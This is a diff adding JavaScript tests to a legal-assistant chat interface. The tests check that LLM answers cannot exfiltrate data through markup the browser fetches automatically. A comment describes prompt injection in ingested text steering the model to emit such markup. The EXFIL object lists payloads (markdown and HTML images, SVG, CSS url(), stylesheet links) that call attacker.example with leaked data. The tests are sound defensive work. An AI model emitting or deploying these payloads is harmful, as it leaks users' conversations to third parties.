@@ -244,3 +244,91 @@ test('source card: without any safe URL the card is not clickable', async () => 
   card.click();
   assert.equal(opened.length, 0);
 });
+
+// --------------------------------------------------------------------------------------------
+// Exfiltration through rendered answers (audit P3.6). The answer is LLM output built from
+// ingested text, so an injected instruction can make it emit markup whose only effect is that the
+// BROWSER requests an attacker URL with the conversation in the query string. No script needed,
+// so the XSS checks above cannot see it.
+// --------------------------------------------------------------------------------------------
+
+/** Elements that make the browser fetch a remote resource by themselves (everything but <a>). */
+function findAutoLoaders(root) {
+  const found = [];
+  const remote = /(https?:)?\/\/|url\(/i;
+  for (const el of root.querySelectorAll('*')) {
+    const tag = el.tagName.toLowerCase();
+    if (tag === 'a') continue;
+    if (['img', 'picture', 'source', 'video', 'audio', 'track', 'link', 'style', 'image', 'use', 'svg', 'math'].includes(tag)) {
+      found.push(`<${tag}>`);
+      continue;
+    }
+    for (const attr of el.attributes) {
+      if (['src', 'srcset', 'poster', 'background', 'style', 'href', 'xlink:href', 'data'].includes(attr.name) && remote.test(attr.value)) {
+        found.push(`${tag}[${attr.name}]`);
+      }
+    }
+  }
+  return found;
+}
+
+const EXFIL = {
+  'markdown image': '![](https://attacker.example/leak?q=SEGREDO)',
+  'html img': '<img src="https://attacker.example/leak?q=SEGREDO">',
+  'html img with srcset': '<img srcset="https://attacker.example/a 1x">',
+  'svg image': '<svg><image href="https://attacker.example/leak?q=SEGREDO"/></svg>',
+  'css background': '<div style="background:url(https://attacker.example/leak?q=SEGREDO)">x</div>',
+  'video poster': '<video poster="https://attacker.example/leak"></video>',
+  'stylesheet link': '<link rel="stylesheet" href="https://attacker.example/x.css">',
+  'style @import': '<style>@import url(https://attacker.example/x.css);</style>',
+};
+
+async function renderAnswer(content) {
+  const window = await boot({
+    '/api/v1/chat/sessions/': () => ({ success: true, sessions: [], count: 0 }),
+    '/api/v1/chat/sessions/1/': () => ({
+      success: true, session: session(),
+      messages: [{ id: 2, role: 'assistant', content, sources: [], metadata: {}, created_at: null }],
+      count: 1, total_count: 1, has_more: false,
+    }),
+  });
+  await window.jurixChat.loadSession(1);
+  await tick();
+  // Only the rendered ANSWER: the surrounding chrome (avatar, icon buttons) legitimately has img/svg.
+  const body = window.document.querySelector('#messages-wrapper .message-assistant .message-body');
+  assert.ok(body, 'the assistant answer body should have rendered');
+  return body;
+}
+
+for (const [name, payload] of Object.entries(EXFIL)) {
+  test(`answer cannot make the browser request a remote resource: ${name}`, async () => {
+    const wrapper = await renderAnswer(`Texto seguro.\n\n${payload}\n\nFim.`);
+    assert.deepEqual(findAutoLoaders(wrapper), []);
+    assert.match(wrapper.textContent, /Texto seguro\./, 'the rest of the answer must survive');
+  });
+}
+
+test('control: findAutoLoaders flags an unsanitised image (detector is not vacuous)', () => {
+  const { window } = new JSDOM('<div id="r"></div>');
+  window.document.getElementById('r').innerHTML = EXFIL['html img'] + EXFIL['css background'];
+  assert.ok(findAutoLoaders(window.document).length >= 2);
+});
+
+test('legitimate legal markdown still renders: bold, lists, tables, code, links, headings', async () => {
+  const md = [
+    '### Art. 5º', '', '**Prazo:** 30 dias.', '', '- inciso um', '- inciso dois', '',
+    '| Tipo | Prazo |', '|---|---|', '| A | 10 |', '',
+    '`código`', '', '[Lei 123](https://sapl.natal.rn.leg.br/norma/123)',
+  ].join('\n');
+  const wrapper = await renderAnswer(md);
+  for (const sel of ['h3', 'strong', 'ul li', 'table td', 'code']) assert.ok(wrapper.querySelector(sel), `missing ${sel}`);
+  const a = wrapper.querySelector('a[href^="https://sapl.natal.rn.leg.br"]');
+  assert.ok(a, 'a normal https link must survive');
+  assert.deepEqual(findDangerous(wrapper), []);
+});
+
+test('table column alignment survives (marked emits the align attribute, not style)', async () => {
+  const body = await renderAnswer('| A | B | C |\n|:--|:-:|--:|\n| 1 | 2 | 3 |');
+  const aligns = [...body.querySelectorAll('th')].map((th) => th.getAttribute('align'));
+  assert.deepEqual(aligns, ['left', 'center', 'right']);
+});
